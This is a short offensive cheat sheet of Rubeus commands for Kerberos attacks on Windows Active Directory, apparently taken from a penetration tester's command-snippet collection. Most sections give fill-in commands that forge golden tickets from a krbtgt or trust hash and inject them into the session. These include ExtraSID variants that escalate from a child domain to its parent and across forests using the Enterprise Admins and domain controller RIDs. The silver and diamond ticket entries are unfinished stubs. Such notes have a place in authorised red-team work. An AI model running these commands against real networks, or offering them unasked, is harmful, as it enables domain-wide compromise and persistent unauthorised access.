# rubeus

% ad, windows, rubeus

#plateform/windows #target/local 

## golden - ptt
#cat/ATTACK/EXPLOIT 
```powershell
.\Rubeus.exe golden /user:<user> /ldap /rc4:<krbtgt_nthash> /endtime:5d /nowrap  /printcmd /ptt
```


## golden - ExtraSID (parent-child) 
```powershell
.\Rubeus.exe golden /user:<user> /ldap /rc4:<krbtgt_nthash> /sids:<dst_domain_sid>-<rid|519> /endtime:5d /nowrap  /printcmd /ptt
```

## golden - ExtraSID (parent-child) (dc account)
#cat/ATTACK/EXPLOIT 
```powershell
.\Rubeus.exe golden /user:<dc_name>$ /ldap /rc4:<krbtgt_nthash> /sids:<dst_domain_sid>-<rid|516> /endtime:5d /nowrap  /printcmd /ptt
```

## golden - ExtraSID (cross-forest)
#cat/ATTACK/EXPLOIT 
```powershell
.\Rubeus.exe golden /user:<user> /ldap /rc4:<krbtgt_nthash> /sids:<dst_domain_sid>-<rid> /endtime:5d /nowrap  /printcmd /ptt
```

## golen - Inter-Realm TGT  
```
.\Rubeus.exe golden /user:<user> /ldap /rc4:<trust_nthash> /sids:<dst_domain_sid>-<rid> /endtime:5d /nowrap  /printcmd /ptt
```

## silver - to do
#cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe silver XXXXXXXXXXXXXXXX
```

## diamond - to do
#cat/ATTACK/EXPLOIT 
```
.\Rubeus.exe diamond XXXXXXXXXXXXXXXX
```
